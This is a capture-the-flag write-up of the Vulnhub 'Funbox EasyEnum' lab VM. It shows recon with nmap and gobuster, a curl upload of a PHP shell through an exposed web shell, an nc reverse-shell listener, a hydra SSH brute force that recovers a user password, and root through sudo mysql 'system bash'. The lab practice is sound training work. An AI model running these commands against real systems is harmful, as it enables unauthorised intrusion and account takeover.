---
title: Vulnhub - Funbox EasyEnum
description: My writeup on Funbox EasyEnum box.
categories:
 - vulnhub
tags: vulnhub gobuster curl web-shell hydra mysql
---

![](https://i.imgur.com/6ghxvXy.png)

## Box Stats

| Box Info      | Details       | 
| ------------- |:-------------:| 
| Box Name :    | **Funbox EasyEnum**  | 
| Series :      | **Funbox**           |
| Difficulty :  | **Easy/Medium**      |   
| Release Date :| **19 Sep 2020**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | [@0815R2d2](https://twitter.com/@0815R2d2){:target="_blank"}      | 
| Download :    | [Funbox EasyEnum](https://www.vulnhub.com/entry/funbox-easyenum,565/){:target="_blank"}      | 

## Summary

Funbox EasyEnum was a pretty easy box. We start by finding a php web shell so this is pretty straightforward and we get a shell as www-data. First privesc is about brute force on user goat & final one we exploit mysql to spawn a root shell. Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.17 
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 02:01 EEST
Nmap scan report for funbox7.zte.com.cn (192.168.1.17)
Host is up (0.00049s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:DE:A0:BD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
$ nmap -p 22,80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 02:01 EEST
Nmap scan report for funbox7.zte.com.cn (192.168.1.17)
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Port 80 has the default apache2 page, without wasting more time lets fire up a `gobuster` scan.

```
$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.txt
/index.html (Status: 200)
/javascript (Status: 301)
/mini.php (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/phpmyadmin (Status: 301)
```

Lot of stuff, `/mini.php` is a php web shell. We can upload our files here:

![](https://i.imgur.com/Uj96Eun.png)

## Shell as www-data

I like to use the CLI way to do my stuff, i'll show you a `curl` trick to upload files. First let's take a look into the html code we have to find the `name`.

```html
<input type="file" name="file"/>
```

So our command will be:

```
$ curl -s -F "file=@shell.php" http://$ip/mini.php > /dev/null
````

Our file successfully uploaded:

![](https://i.imgur.com/Ug5xwof.png)

Now we can simply execute it & get a shell back:

```
$ curl -s http://$ip/shell.php
```

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox7:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as goat

I enumerated a lot but i wasn't able to find something exploitable. Anyway system has lot of users:

```
www-data@funbox7:/$ cat /etc/passwd | cut -d ':' -f 1,7 | grep "bash\|sh" | grep -v "sshd"
root:/bin/bash
karla:/bin/bash
harry:/bin/bash
sally:/bin/bash
goat:/bin/bash
oracle:/bin/bash
lissy:/bin/sh
```

I tried SSH brute force with all of them only user's `goat` password found:

```
$ hydra -l goat -P /usr/share/wordlists/rockyou.txt $ip ssh

[DATA] attacking ssh://192.168.1.16:22/
[STATUS] 181.00 tries/min, 181 tries in 00:01h, 14344223 to do in 1320:50h, 16 active
[STATUS] 134.67 tries/min, 404 tries in 00:03h, 14344000 to do in 1775:15h, 16 active
[STATUS] 117.29 tries/min, 821 tries in 00:07h, 14343583 to do in 2038:17h, 16 active
[22][ssh] host: 192.168.1.16   login: goat   password: thebest
1 of 1 target successfully completed, 1 valid password found
```

```
www-data@funbox7:/$ su - goat
Password: thebest

goat@funbox7:~$ whoami;id
goat
uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)
```

## Shell as root

`sudo -l` shows that we can execute `mysql` as root:

```
goat@funbox7:~$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
```

We can simply exploit that using the `system` function of `mysql`.

```
goat@funbox7:~$ sudo mysql -s
mysql> system bash
root@funbox7:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the flag(s)

![](https://i.imgur.com/M5DQa7b.png)

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:

Until next time keep pwning hard! :fire:
